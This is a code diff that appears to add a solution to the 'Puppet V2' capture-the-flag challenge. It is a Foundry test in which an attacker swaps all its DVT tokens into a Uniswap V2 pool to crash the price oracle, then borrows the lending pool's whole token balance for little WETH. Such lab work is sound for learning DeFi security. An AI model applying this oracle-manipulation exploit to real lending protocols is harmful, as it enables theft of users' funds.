@@ -104,6 +104,29 @@ contract PuppetV2 is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        address[] memory path = new address[] (2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE}();
+
+        console.log("before attacker balance: ", weth.balanceOf(address(attacker)));
+
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 1, path, address(attacker), block.timestamp * 2
+        );
+
+        uint256 wethRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("deposit required: ", wethRequired);
+        console.log("attacker balance: ", weth.balanceOf(address(attacker)));
+
+        weth.approve(address(puppetV2Pool), wethRequired);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
